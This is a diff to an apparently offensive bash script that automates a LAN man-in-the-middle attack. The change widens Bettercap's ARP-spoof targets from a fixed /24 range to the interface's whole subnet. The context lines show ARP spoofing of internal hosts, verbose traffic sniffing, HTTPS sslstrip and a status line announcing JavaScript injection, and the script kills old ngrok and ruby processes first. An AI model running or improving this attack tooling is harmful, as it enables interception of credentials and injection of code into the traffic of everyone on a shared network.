@@ -54,8 +54,12 @@ if [[ -z "$LAN" ]]; then
   exit 1
 fi
 
-# --- Get LAN Base for arp spoof range ---
-LAN_BASE=$(echo "$LAN" | cut -d '.' -f 1-3)
+# --- Get full subnet range ---
+NET_RANGE=$(ip -o -f inet addr show "$IFACE" | awk '{print $4}')
+if [[ -z "$NET_RANGE" ]]; then
+  color_print RED "[X] Could not determine subnet range for $IFACE. Exiting."
+  exit 1
+fi
 
 # --- Kill old processes ---
 pkill -f 'ngrok|ruby' 2>/dev/null
@@ -114,7 +118,7 @@ color_print GREEN "[*] Running Bettercap with MITM and JS injection..."
 
 # --- Run Bettercap ---
 bettercap -iface "$IFACE" -eval "\
-set arp.spoof.targets ${LAN_BASE}.1-254; \
+set arp.spoof.targets $NET_RANGE; \
 set arp.spoof.internal true; \
 set net.sniff.verbose true; \
 set https.proxy.sslstrip true; \
